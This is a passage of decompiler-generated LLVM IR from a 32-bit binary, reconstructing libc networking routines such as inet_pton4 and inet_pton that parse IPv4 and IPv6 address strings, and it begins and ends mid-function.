  store i32 0, i32* %eax.global-to-local, align 4
  %v0_805d6e8 = load i32, i32* @ebx, align 4
  %v1_805d6e8 = inttoptr i32 %v0_805d6e8 to i32*
  %v2_805d6e8 = load i32, i32* %v1_805d6e8, align 4
  %v11_805d6e8 = icmp eq i32 %v2_805d6e8, 24
  %v1_805d6eb = icmp eq i1 %v11_805d6e8, false
  br i1 %v1_805d6eb, label %dec_label_pc_805d707, label %dec_label_pc_805d702

dec_label_pc_805d6ef:                             ; preds = %dec_label_pc_805d6d1
  %v2_805d6f3 = call i32 @__libc_close(i32 %v5_805d6da)
  store i32 1, i32* %eax.global-to-local, align 4
  %v1_805d70d.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805d707

dec_label_pc_805d702:                             ; preds = %dec_label_pc_805d6e6, %dec_label_pc_805d6b1
  %v1_805d70d84 = phi i32 [ %v0_805d6e8, %dec_label_pc_805d6e6 ], [ %v1_805d6b3, %dec_label_pc_805d6b1 ]
  store i32 1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805d707

dec_label_pc_805d707:                             ; preds = %dec_label_pc_805d6e6, %dec_label_pc_805d6c6, %dec_label_pc_805d6ef, %dec_label_pc_805d702
  %v1_805d70d = phi i32 [ %v0_805d6e8, %dec_label_pc_805d6e6 ], [ %v1_805d6b3, %dec_label_pc_805d6c6 ], [ %v1_805d70d.pre, %dec_label_pc_805d6ef ], [ %v1_805d70d84, %dec_label_pc_805d702 ]
  %v0_805d70b = phi i1 [ true, %dec_label_pc_805d6e6 ], [ false, %dec_label_pc_805d6c6 ], [ false, %dec_label_pc_805d6ef ], [ false, %dec_label_pc_805d702 ]
  %v2_805d70d = inttoptr i32 %v1_805d70d to i32*
  store i32 %v2_805d6be, i32* %v2_805d70d, align 4
  %v0_805d78c.pre.pre = load i32, i32* @ebp, align 4
  br i1 %v0_805d70b, label %dec_label_pc_805d78c, label %dec_label_pc_805d711

dec_label_pc_805d711:                             ; preds = %dec_label_pc_805d707, %dec_label_pc_805d6ac
  %v4_805d735 = phi i32 [ %v0_805d69d, %dec_label_pc_805d6ac ], [ %v0_805d78c.pre.pre, %dec_label_pc_805d707 ]
  %v5_805d735 = add i32 %v4_805d735, 4
  %v6_805d735 = inttoptr i32 %v5_805d735 to i32*
  %v7_805d735 = load i32, i32* %v6_805d735, align 4
  call void @__pseudo_call(i32 %v7_805d735)
  %v0_805d73b = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_805d73b, i32* @esi, align 4
  %v1_805d73d = icmp eq i32 %v0_805d73b, 0
  br i1 %v1_805d73d, label %dec_label_pc_805d788, label %dec_label_pc_805d741

dec_label_pc_805d741:                             ; preds = %dec_label_pc_805d711
  %v0_805d741 = load i32, i32* @edi, align 4
  %v1_805d741 = add i32 %v0_805d741, 4
  %v2_805d741 = inttoptr i32 %v1_805d741 to i32*
  %v3_805d741 = load i32, i32* %v2_805d741, align 4
  %v4_805d741 = icmp eq i32 %v3_805d741, 0
  %v1_805d745 = icmp eq i1 %v4_805d741, false
  br i1 %v1_805d745, label %dec_label_pc_805d756, label %dec_label_pc_805d747

dec_label_pc_805d747:                             ; preds = %dec_label_pc_805d741
  %v3_805d747 = and i32 %v0_805d73b, 256
  %v4_805d747 = icmp eq i32 %v3_805d747, 0
  br i1 %v4_805d747, label %dec_label_pc_805d756, label %dec_label_pc_805d74c

dec_label_pc_805d74c:                             ; preds = %dec_label_pc_805d747
  %v0_805d750 = load i32, i32* @ebp, align 4
  %v1_805d78f = add i32 %v0_805d750, 4
  %v2_805d78f = inttoptr i32 %v1_805d78f to i32*
  %v3_805d78f = load i32, i32* %v2_805d78f, align 4
  %v4_805d78f = icmp eq i32 %v3_805d78f, 0
  %v1_805d793 = icmp eq i1 %v4_805d78f, false
  br i1 %v1_805d793, label %dec_label_pc_805d69a, label %dec_label_pc_805d799.thread123

dec_label_pc_805d799.thread123:                   ; preds = %dec_label_pc_805d74c
  store i32 -6, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805d7a5

dec_label_pc_805d756:                             ; preds = %dec_label_pc_805d747, %dec_label_pc_805d741
  %v3_805d756 = load i8*, i8** %stack_var_-24, align 4
  %v4_805d756 = ptrtoint i8* %v3_805d756 to i32
  store i32 %v4_805d756, i32* %eax.global-to-local, align 4
  %v1_805d75a = icmp eq i8* %v3_805d756, null
  br i1 %v1_805d75a, label %dec_label_pc_805d7d4, label %dec_label_pc_805d75e

dec_label_pc_805d75e:                             ; preds = %dec_label_pc_805d756
  %v1_805d762 = call i32 @freeaddrinfo(i32 %v4_805d756)
  store i32 %v1_805d762, i32* %eax.global-to-local, align 4
  %v0_805d76a.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805d7d4

dec_label_pc_805d788:                             ; preds = %dec_label_pc_805d711
  %v4_805d711 = add i32 %stack_var_-88.130, 1
  %v0_805d788 = load i32, i32* @ebp, align 4
  br label %dec_label_pc_805d78c

dec_label_pc_805d78c:                             ; preds = %dec_label_pc_805d707, %dec_label_pc_805d6a4, %dec_label_pc_805d788
  %stack_var_-80.1 = phi i32 [ %v0_805d788, %dec_label_pc_805d788 ], [ %stack_var_-80.232, %dec_label_pc_805d707 ], [ %stack_var_-80.232, %dec_label_pc_805d6a4 ]
  %v0_805d78c = phi i32 [ %v0_805d788, %dec_label_pc_805d788 ], [ %v0_805d78c.pre.pre, %dec_label_pc_805d707 ], [ %v0_805d69d, %dec_label_pc_805d6a4 ]
  %stack_var_-88.0 = phi i32 [ %v4_805d711, %dec_label_pc_805d788 ], [ %stack_var_-88.130, %dec_label_pc_805d707 ], [ %stack_var_-88.130, %dec_label_pc_805d6a4 ]
  %v1_805d78c = add i32 %v0_805d78c, 8
  store i32 %v1_805d78c, i32* @ebp, align 4
  %v1_805d78f19 = add i32 %v0_805d78c, 12
  %v2_805d78f20 = inttoptr i32 %v1_805d78f19 to i32*
  %v3_805d78f21 = load i32, i32* %v2_805d78f20, align 4
  %v4_805d78f22 = icmp eq i32 %v3_805d78f21, 0
  %v1_805d79329 = icmp eq i1 %v4_805d78f22, false
  br i1 %v1_805d79329, label %dec_label_pc_805d78c.dec_label_pc_805d69a.lr.ph_crit_edge, label %dec_label_pc_805d799

dec_label_pc_805d78c.dec_label_pc_805d69a.lr.ph_crit_edge: ; preds = %dec_label_pc_805d78c
  %v0_805d69a.pre.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805d69a.lr.ph

dec_label_pc_805d69a.lr.ph:                       ; preds = %dec_label_pc_805d78c.dec_label_pc_805d69a.lr.ph_crit_edge, %dec_label_pc_805d69a.lr.ph.lr.ph
  %v0_805d69a.pre = phi i32 [ %v0_805d69a.pre91, %dec_label_pc_805d69a.lr.ph.lr.ph ], [ %v0_805d69a.pre.pre, %dec_label_pc_805d78c.dec_label_pc_805d69a.lr.ph_crit_edge ]
  %v0_805d69d82 = phi i32 [ ptrtoint (i32* @global_var_806da40.754 to i32), %dec_label_pc_805d69a.lr.ph.lr.ph ], [ %v1_805d78c, %dec_label_pc_805d78c.dec_label_pc_805d69a.lr.ph_crit_edge ]
  %stack_var_-80.2.ph64 = phi i32 [ %stack_var_-80.0, %dec_label_pc_805d69a.lr.ph.lr.ph ], [ %stack_var_-80.1, %dec_label_pc_805d78c.dec_label_pc_805d69a.lr.ph_crit_edge ]
  %stack_var_-88.1.ph63 = phi i32 [ 0, %dec_label_pc_805d69a.lr.ph.lr.ph ], [ %stack_var_-88.0, %dec_label_pc_805d78c.dec_label_pc_805d69a.lr.ph_crit_edge ]
  br label %dec_label_pc_805d69a

dec_label_pc_805d799:                             ; preds = %dec_label_pc_805d78c
  store i32 -6, i32* %eax.global-to-local, align 4
  %v4_805d79e = icmp eq i32 %stack_var_-88.0, 0
  br i1 %v4_805d79e, label %dec_label_pc_805d7e5, label %dec_label_pc_805d7a5

dec_label_pc_805d7a5:                             ; preds = %dec_label_pc_805d799.thread123, %dec_label_pc_805d799
  %v3_805d7a5 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_805d7a5, i32* %eax.global-to-local, align 4
  %v1_805d7a9 = icmp eq i32 %v3_805d7a5, 0
  br i1 %v1_805d7a9, label %dec_label_pc_805d7b7, label %dec_label_pc_805d7ad

dec_label_pc_805d7ad:                             ; preds = %dec_label_pc_805d7a5
  %v2_805d7b1 = inttoptr i32 %arg4 to i32*
  store i32 %v3_805d7a5, i32* %v2_805d7b1, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805d7e5

dec_label_pc_805d7b7:                             ; preds = %dec_label_pc_805d7a5
  %v1_805d7bc = icmp eq i1 %v4_805d669, false
  br i1 %v1_805d7bc, label %dec_label_pc_805d7c9, label %dec_label_pc_805d7be

dec_label_pc_805d7be:                             ; preds = %dec_label_pc_805d7b7
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805d7e5

dec_label_pc_805d7c9:                             ; preds = %dec_label_pc_805d7b7
  br label %dec_label_pc_805d7db

dec_label_pc_805d7d4:                             ; preds = %dec_label_pc_805d75e, %dec_label_pc_805d756
  %v0_805d76a = phi i32 [ %v0_805d73b, %dec_label_pc_805d756 ], [ %v0_805d76a.pre, %dec_label_pc_805d75e ]
  %v13_805d7d4 = and i32 %v0_805d76a, -257
  %v1_805d7d7 = sub i32 0, %v13_805d7d4
  store i32 %v1_805d7d7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805d7e5

dec_label_pc_805d7db:                             ; preds = %dec_label_pc_805d7c9, %dec_label_pc_805d619, %dec_label_pc_805d5ae
  store i32 -2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805d7e5

dec_label_pc_805d7e2:                             ; preds = %dec_label_pc_805d5e3, %dec_label_pc_805d5d2
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805d7e5

dec_label_pc_805d7e5:                             ; preds = %dec_label_pc_805d799.thread, %dec_label_pc_805d7be, %dec_label_pc_805d799, %dec_label_pc_805d640, %dec_label_pc_805d7db, %dec_label_pc_805d7d4, %dec_label_pc_805d7ad, %dec_label_pc_805d7e2
  %v0_805d7ec = phi i32 [ 0, %dec_label_pc_805d7be ], [ -6, %dec_label_pc_805d799 ], [ -8, %dec_label_pc_805d640 ], [ -2, %dec_label_pc_805d7db ], [ %v1_805d7d7, %dec_label_pc_805d7d4 ], [ 0, %dec_label_pc_805d7ad ], [ -1, %dec_label_pc_805d7e2 ], [ -6, %dec_label_pc_805d799.thread ]
  store i32 %v0_805d564, i32* @ebx, align 4
  store i32 %v0_805d563, i32* @esi, align 4
  store i32 %v0_805d562, i32* @edi, align 4
  store i32 %v0_805d561, i32* @ebp, align 4
  ret i32 %v0_805d7ec

; uselistorder directives
  uselistorder i32 %v0_805d78c, { 1, 0 }
  uselistorder i32 %v0_805d750, { 1, 0, 2 }
  uselistorder i32 %v0_805d741, { 1, 0 }
  uselistorder i32 %v0_805d73b, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v0_805d6e8, { 1, 0, 2 }
  uselistorder i32 %v1_805d6d1, { 1, 0 }
  uselistorder i32 %v1_805d6b3, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_805d69d, { 1, 0, 2 }
  uselistorder i32 %v3_805d69a, { 1, 0 }
  uselistorder i1 %v4_805d669, { 1, 0 }
  uselistorder i32 %v0_805d63a, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v2_805d5ac, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0, 2 }
  uselistorder i8** %stack_var_-24, { 2, 1, 0 }
  uselistorder i32* %stack_var_-20, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 17, 10, 11, 12, 13, 14, 15, 16, 18, 31, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30 }
  uselistorder i32 (i32)* @freeaddrinfo, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2, 3, 4, 5 }
  uselistorder i8* %arg1, { 1, 0, 2, 4, 3 }
  uselistorder label %dec_label_pc_805d7e5, { 7, 4, 5, 1, 6, 2, 0, 3 }
  uselistorder label %dec_label_pc_805d7a5, { 1, 0 }
  uselistorder label %dec_label_pc_805d78c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805d707, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_805d678, { 1, 0 }
  uselistorder label %dec_label_pc_805d661, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_805d5d2, { 1, 0 }
  uselistorder label %dec_label_pc_805d5ae, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805d598, { 2, 0, 1 }
}

define i32 @inet_pton4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_805d7f2 = load i32, i32* @esi, align 4
  %v0_805d7f9 = load i32, i32* @eax, align 4
  store i32 %v0_805d7f9, i32* %ebx.global-to-local, align 4
  store i32 0, i32* @edx, align 4
  store i32 0, i32* @edi, align 4
  %v2_805d7ff = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_805d7ff, i32* @esi, align 4
  store i32 0, i32* %stack_var_-20, align 4
  %v1_805d84715 = inttoptr i32 %v0_805d7f9 to i8*
  %v2_805d84716 = load i8, i8* %v1_805d84715, align 1
  %v3_805d84717 = sext i8 %v2_805d84716 to i32
  store i32 %v3_805d84717, i32* @ecx, align 4
  %v1_805d84a18 = add i32 %v0_805d7f9, 1
  store i32 %v1_805d84a18, i32* %ebx.global-to-local, align 4
  %v1_805d84b19 = icmp eq i8 %v2_805d84716, 0
  %v1_805d84d20 = icmp eq i1 %v1_805d84b19, false
  br i1 %v1_805d84d20, label %dec_label_pc_805d80a, label %dec_label_pc_805d84f

dec_label_pc_805d80a:                             ; preds = %entry, %dec_label_pc_805d847.backedge
  %v3_805d84722 = phi i32 [ %v3_805d847, %dec_label_pc_805d847.backedge ], [ %v3_805d84717, %entry ]
  %v2_805d84721 = phi i8 [ %v2_805d847, %dec_label_pc_805d847.backedge ], [ %v2_805d84716, %entry ]
  %v1_805d80a = add nsw i32 %v3_805d84722, -48
  store i32 %v1_805d80a, i32* @eax, align 4
  %v6_805d810 = icmp ugt i32 %v1_805d80a, 9
  br i1 %v6_805d810, label %dec_label_pc_805d833, label %dec_label_pc_805d812

dec_label_pc_805d812:                             ; preds = %dec_label_pc_805d80a
  %v0_805d812 = load i32, i32* @esi, align 4
  %v1_805d812 = inttoptr i32 %v0_805d812 to i8*
  %v2_805d812 = load i8, i8* %v1_805d812, align 1
  %v2_805d815 = zext i8 %v2_805d812 to i32
  %v3_805d815 = mul nuw nsw i32 %v2_805d815, 10
  %v3_805d818 = add nsw i32 %v3_805d815, %v1_805d80a
  store i32 %v3_805d818, i32* @eax, align 4
  %v6_805d821 = icmp ugt i32 %v3_805d818, 255
  br i1 %v6_805d821, label %dec_label_pc_805d86c, label %dec_label_pc_805d823

dec_label_pc_805d823:                             ; preds = %dec_label_pc_805d812
  %v1_805d823 = trunc i32 %v3_805d818 to i8
  store i8 %v1_805d823, i8* %v1_805d812, align 1
  %v0_805d825 = load i32, i32* @edx, align 4
  %v1_805d825 = icmp eq i32 %v0_805d825, 0
  %v1_805d827 = icmp eq i1 %v1_805d825, false
  br i1 %v1_805d827, label %dec_label_pc_805d847.backedge, label %dec_label_pc_805d829

dec_label_pc_805d829:                             ; preds = %dec_label_pc_805d823
  %v0_805d829 = load i32, i32* @edi, align 4
  %v1_805d829 = add i32 %v0_805d829, 1
  store i32 %v1_805d829, i32* @edi, align 4
  %v1_805d82a = add i32 %v0_805d829, -3
  %v6_805d82a = sub i32 2, %v0_805d829
  %v7_805d82a = and i32 %v6_805d82a, %v1_805d829
  %v8_805d82a = icmp slt i32 %v7_805d82a, 0
  %v9_805d82a = icmp eq i32 %v1_805d82a, 0
  %v10_805d82a = icmp slt i32 %v1_805d82a, 0
  %v3_805d82d = icmp eq i1 %v10_805d82a, %v8_805d82a
  %v4_805d82d = icmp eq i1 %v9_805d82a, false
  %v5_805d82d = and i1 %v4_805d82d, %v3_805d82d
  br i1 %v5_805d82d, label %dec_label_pc_805d86c, label %dec_label_pc_805d82f

dec_label_pc_805d82f:                             ; preds = %dec_label_pc_805d829
  %v1_805d82f = and i32 %v0_805d825, -256
  %v2_805d82f = or i32 %v1_805d82f, 1
  store i32 %v2_805d82f, i32* @edx, align 4
  br label %dec_label_pc_805d847.backedge

dec_label_pc_805d833:                             ; preds = %dec_label_pc_805d80a
  %v9_805d833 = icmp eq i8 %v2_805d84721, 46
  %v1_805d836 = icmp eq i1 %v9_805d833, false
  br i1 %v1_805d836, label %dec_label_pc_805d86c, label %dec_label_pc_805d838

dec_label_pc_805d838:                             ; preds = %dec_label_pc_805d833
  %v0_805d838 = load i32, i32* @edx, align 4
  %v1_805d838 = icmp eq i32 %v0_805d838, 0
  br i1 %v1_805d838, label %dec_label_pc_805d86c, label %dec_label_pc_805d83c

dec_label_pc_805d83c:                             ; preds = %dec_label_pc_805d838
  %v0_805d83c = load i32, i32* @edi, align 4
  %v9_805d83c = icmp eq i32 %v0_805d83c, 4
  br i1 %v9_805d83c, label %dec_label_pc_805d86c, label %dec_label_pc_805d841

dec_label_pc_805d841:                             ; preds = %dec_label_pc_805d83c
  %v0_805d841 = load i32, i32* @esi, align 4
  %v1_805d841 = add i32 %v0_805d841, 1
  store i32 %v1_805d841, i32* @esi, align 4
  store i32 0, i32* @edx, align 4
  %v1_805d844 = inttoptr i32 %v1_805d841 to i8*
  store i8 0, i8* %v1_805d844, align 1
  br label %dec_label_pc_805d847.backedge

dec_label_pc_805d847.backedge:                    ; preds = %dec_label_pc_805d841, %dec_label_pc_805d82f, %dec_label_pc_805d823
  %v0_805d847.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_805d847 = inttoptr i32 %v0_805d847.pre to i8*
  %v2_805d847 = load i8, i8* %v1_805d847, align 1
  %v3_805d847 = sext i8 %v2_805d847 to i32
  store i32 %v3_805d847, i32* @ecx, align 4
  %v1_805d84a = add i32 %v0_805d847.pre, 1
  store i32 %v1_805d84a, i32* %ebx.global-to-local, align 4
  %v1_805d84b = icmp eq i8 %v2_805d847, 0
  %v1_805d84d = icmp eq i1 %v1_805d84b, false
  br i1 %v1_805d84d, label %dec_label_pc_805d80a, label %dec_label_pc_805d847.dec_label_pc_805d84f_crit_edge

dec_label_pc_805d847.dec_label_pc_805d84f_crit_edge: ; preds = %dec_label_pc_805d847.backedge
  %v0_805d84f.pre = load i32, i32* @edi, align 4
  %phitmp = icmp sgt i32 %v0_805d84f.pre, 3
  br label %dec_label_pc_805d84f

dec_label_pc_805d84f:                             ; preds = %dec_label_pc_805d847.dec_label_pc_805d84f_crit_edge, %entry
  %v0_805d84f = phi i1 [ %phitmp, %dec_label_pc_805d847.dec_label_pc_805d84f_crit_edge ], [ false, %entry ]
  br i1 %v0_805d84f, label %dec_label_pc_805d854, label %dec_label_pc_805d86c

dec_label_pc_805d854:                             ; preds = %dec_label_pc_805d84f
  %v0_805d854 = load i32, i32* @eax, align 4
  %v3_805d85d = bitcast i32* %stack_var_-20 to i16*
  %v4_805d85d = call i32 @memcpy(i16* %v3_805d85d, i32 4, i32 %v0_805d854)
  br label %dec_label_pc_805d86e

dec_label_pc_805d86c:                             ; preds = %dec_label_pc_805d83c, %dec_label_pc_805d838, %dec_label_pc_805d833, %dec_label_pc_805d829, %dec_label_pc_805d812, %dec_label_pc_805d84f
  br label %dec_label_pc_805d86e

dec_label_pc_805d86e:                             ; preds = %dec_label_pc_805d854, %dec_label_pc_805d86c
  %v0_805d875 = phi i32 [ 1, %dec_label_pc_805d854 ], [ 0, %dec_label_pc_805d86c ]
  store i32 %v0_805d7f2, i32* @esi, align 4
  ret i32 %v0_805d875

; uselistorder directives
  uselistorder i32 %v3_805d847, { 1, 0 }
  uselistorder i8 %v2_805d847, { 1, 2, 0 }
  uselistorder i32 %v1_805d82a, { 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_805d86e, { 1, 0 }
  uselistorder label %dec_label_pc_805d86c, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_805d80a, { 1, 0 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_805d876 = load i32, i32* @ebp, align 4
  %v0_805d877 = load i32, i32* @edi, align 4
  %v0_805d878 = load i32, i32* @esi, align 4
  %v0_805d879 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v4_805d881 = ptrtoint i8* %arg2 to i32
  store i32 %v4_805d881, i32* @edi, align 4
  %v9_805d885 = icmp eq i32 %arg1, 2
  br i1 %v9_805d885, label %dec_label_pc_805d895, label %dec_label_pc_805d88a

dec_label_pc_805d88a:                             ; preds = %entry
  %v9_805d88a = icmp eq i32 %arg1, 10
  %v1_805d88d = icmp eq i1 %v9_805d88a, false
  br i1 %v1_805d88d, label %dec_label_pc_805da26, label %dec_label_pc_805d8a5

dec_label_pc_805d895:                             ; preds = %entry
  store i32 %arg3, i32* @edx, align 4
  store i32 %v4_805d881, i32* @eax, align 4
  %v3_805d89b = call i32 @inet_pton4(i32 %v0_805d879, i32 %v0_805d878, i32 %v0_805d877)
  store i32 %v3_805d89b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805da38

dec_label_pc_805d8a5:                             ; preds = %dec_label_pc_805d88a
  %v2_805d8aa = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_805d8aa, i32* %eax.global-to-local, align 4
  %tmp61 = bitcast i32* %stack_var_-32 to i8*
  %v5_805d8af = call i32 @__GI_memset(i8* %tmp61, i32 0, i32 16)
  store i32 %v5_805d8af, i32* @ebx, align 4
  %v2_805d8b6 = add i32 %v5_805d8af, 16
  store i32 %v2_805d8b6, i32* %eax.global-to-local, align 4
  %v0_805d8c0 = load i32, i32* @edi, align 4
  %v1_805d8c0 = inttoptr i32 %v0_805d8c0 to i8*
  %v2_805d8c0 = load i8, i8* %v1_805d8c0, align 1
  %v11_805d8c0 = icmp eq i8 %v2_805d8c0, 58
  %v1_805d8c3 = icmp eq i1 %v11_805d8c0, false
  br i1 %v1_805d8c3, label %dec_label_pc_805d956, label %dec_label_pc_805d8c5

dec_label_pc_805d8c5:                             ; preds = %dec_label_pc_805d8a5
  %v1_805d8c5 = add i32 %v0_805d8c0, 1
  store i32 %v1_805d8c5, i32* @edi, align 4
  %v1_805d8c6 = inttoptr i32 %v1_805d8c5 to i8*
  %v2_805d8c6 = load i8, i8* %v1_805d8c6, align 1
  %v11_805d8c6 = icmp eq i8 %v2_805d8c6, 58
  %v1_805d8c9 = icmp eq i1 %v11_805d8c6, false
  br i1 %v1_805d8c9, label %dec_label_pc_805da36, label %dec_label_pc_805d956

dec_label_pc_805d8dd:                             ; preds = %dec_label_pc_805d996
  %v4_805d8e5 = call i32 @__GI_strchr(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_806da97.755, i32 0, i32 0), i32 %v2_805d99d)
  store i32 %v4_805d8e5, i32* %eax.global-to-local, align 4
  %v0_805d8ea = load i32, i32* @edi, align 4
  %v1_805d8ea = add i32 %v0_805d8ea, 1
  store i32 %v1_805d8ea, i32* @edi, align 4
  %v1_805d8ee = icmp eq i32 %v4_805d8e5, 0
  br i1 %v1_805d8ee, label %dec_label_pc_805d90d, label %dec_label_pc_805d8f2

dec_label_pc_805d8f2:                             ; preds = %dec_label_pc_805d8dd
  %v0_805d8f2 = load i32, i32* @ebp, align 4
  %v2_805d8f2 = mul i32 %v0_805d8f2, 16
  %v1_805d8f5 = add i32 %v4_805d8e5, -134666903
  store i32 %v1_805d8f5, i32* %eax.global-to-local, align 4
  %v2_805d8fa = or i32 %v2_805d8f2, %v1_805d8f5
  store i32 %v2_805d8fa, i32* @ebp, align 4
  %tmp129 = icmp ult i32 %v2_805d8fa, 65536
  br i1 %tmp129, label %dec_label_pc_805d996.outer, label %dec_label_pc_805da36

dec_label_pc_805d996.outer:                       ; preds = %dec_label_pc_805d8f2, %dec_label_pc_805d956
  %v0_805d99937 = phi i32 [ %v1_805d8ea, %dec_label_pc_805d8f2 ], [ %stack_var_-36.0.in, %dec_label_pc_805d956 ]
  %stack_var_-44.1.ph = phi i8* [ %stack_var_-44.1, %dec_label_pc_805d8f2 ], [ %stack_var_-44.0, %dec_label_pc_805d956 ]
  %stack_var_-36.1.ph = phi i8* [ %stack_var_-36.1, %dec_label_pc_805d8f2 ], [ %stack_var_-36.0, %dec_label_pc_805d956 ]
  %stack_var_-48.0.ph = phi i32 [ 1, %dec_label_pc_805d8f2 ], [ 0, %dec_label_pc_805d956 ]
  %v4_805d912 = icmp eq i32 %stack_var_-48.0.ph, 0
  %v1_805d917 = icmp eq i1 %v4_805d912, false
  br label %dec_label_pc_805d996

dec_label_pc_805d90d:                             ; preds = %dec_label_pc_805d8dd
  %v0_805d90d = load i32, i32* @esi, align 4
  %v9_805d90d = icmp eq i32 %v0_805d90d, 58
  %v1_805d910 = icmp eq i1 %v9_805d90d, false
  br i1 %v1_805d910, label %dec_label_pc_805d962, label %dec_label_pc_805d912

dec_label_pc_805d912:                             ; preds = %dec_label_pc_805d90d
  br i1 %v1_805d917, label %dec_label_pc_805d92e, label %dec_label_pc_805d919

dec_label_pc_805d919:                             ; preds = %dec_label_pc_805d912
  %v5_805d919 = icmp eq i8* %stack_var_-44.1, null
  %v1_805d91e = icmp eq i1 %v5_805d919, false
  br i1 %v1_805d91e, label %dec_label_pc_805da36, label %dec_label_pc_805d924

dec_label_pc_805d924:                             ; preds = %dec_label_pc_805d919
  %v0_805d924 = load i32, i32* @ebx, align 4
  %v5_805d924 = inttoptr i32 %v0_805d924 to i8*
  %v5_805d928 = inttoptr i32 %v1_805d8ea to i8*
  br label %dec_label_pc_805d996

dec_label_pc_805d92e:                             ; preds = %dec_label_pc_805d912
  %v1_805d92e = inttoptr i32 %v1_805d8ea to i8*
  %v2_805d92e = load i8, i8* %v1_805d92e, align 1
  %v3_805d92e = icmp eq i8 %v2_805d92e, 0
  br i1 %v3_805d92e, label %dec_label_pc_805da36, label %dec_label_pc_805d937

dec_label_pc_805d937:                             ; preds = %dec_label_pc_805d92e
  %v0_805d937 = load i32, i32* @ebx, align 4
  %v1_805d937 = add i32 %v0_805d937, 2
  store i32 %v1_805d937, i32* @edx, align 4
  %v6_805d93e = icmp ugt i32 %v1_805d937, %v2_805d8b6
  br i1 %v6_805d93e, label %dec_label_pc_805da36, label %dec_label_pc_805d944

dec_label_pc_805d944:                             ; preds = %dec_label_pc_805d937
  %v0_805d944 = load i32, i32* @ebp, align 4
  %v2_805d946 = udiv i32 %v0_805d944, 256
  %v4_805d946 = trunc i32 %v2_805d946 to i8
  %v3_805d949 = inttoptr i32 %v0_805d937 to i8*
  store i8 %v4_805d946, i8* %v3_805d949, align 1
  %v0_805d94b = load i32, i32* @ebp, align 4
  store i32 %v0_805d94b, i32* %eax.global-to-local, align 4
  %v1_805d94d = trunc i32 %v0_805d94b to i8
  %v2_805d94d = load i32, i32* @ebx, align 4
  %v3_805d94d = add i32 %v2_805d94d, 1
  %v4_805d94d = inttoptr i32 %v3_805d94d to i8*
  store i8 %v1_805d94d, i8* %v4_805d94d, align 1
  %v0_805d950 = load i32, i32* @edx, align 4
  store i32 %v0_805d950, i32* @ebx, align 4
  %stack_var_-36.0.in.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805d956

dec_label_pc_805d956:                             ; preds = %dec_label_pc_805d8a5, %dec_label_pc_805d8c5, %dec_label_pc_805d944
  %stack_var_-36.0.in = phi i32 [ %stack_var_-36.0.in.pre, %dec_label_pc_805d944 ], [ %v1_805d8c5, %dec_label_pc_805d8c5 ], [ %v0_805d8c0, %dec_label_pc_805d8a5 ]
  %stack_var_-44.0 = phi i8* [ %stack_var_-44.1, %dec_label_pc_805d944 ], [ null, %dec_label_pc_805d8c5 ], [ null, %dec_label_pc_805d8a5 ]
  %stack_var_-36.0 = inttoptr i32 %stack_var_-36.0.in to i8*
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_805d996.outer

dec_label_pc_805d962:                             ; preds = %dec_label_pc_805d90d
  %v9_805d962 = icmp eq i32 %v0_805d90d, 46
  %v1_805d965 = icmp eq i1 %v9_805d962, false
  br i1 %v1_805d965, label %dec_label_pc_805da36, label %dec_label_pc_805d96b

dec_label_pc_805d96b:                             ; preds = %dec_label_pc_805d962
  %v0_805d96b = load i32, i32* @ebx, align 4
  %v1_805d96b = add i32 %v0_805d96b, 4
  store i32 %v1_805d96b, i32* @esi, align 4
  %v6_805d972 = icmp ugt i32 %v1_805d96b, %v2_805d8b6
  br i1 %v6_805d972, label %dec_label_pc_805da36, label %dec_label_pc_805d978

dec_label_pc_805d978:                             ; preds = %dec_label_pc_805d96b
  store i32 %v0_805d96b, i32* @edx, align 4
  %v4_805d97a = ptrtoint i8* %stack_var_-36.1 to i32
  store i32 %v4_805d97a, i32* @eax, align 4
  %v2_805d97e = ptrtoint i8* %stack_var_-44.1 to i32
  %v5_805d97e = call i32 @inet_pton4(i32 %stack_var_-48.0.ph, i32 %v2_805d97e, i32 %v2_805d8b6)
  store i32 %v5_805d97e, i32* %eax.global-to-local, align 4
  %v0_805d983 = load i32, i32* @esi, align 4
  %tmp62 = icmp slt i32 %v5_805d97e, 1
  %tmp63 = icmp eq i1 %tmp62, false
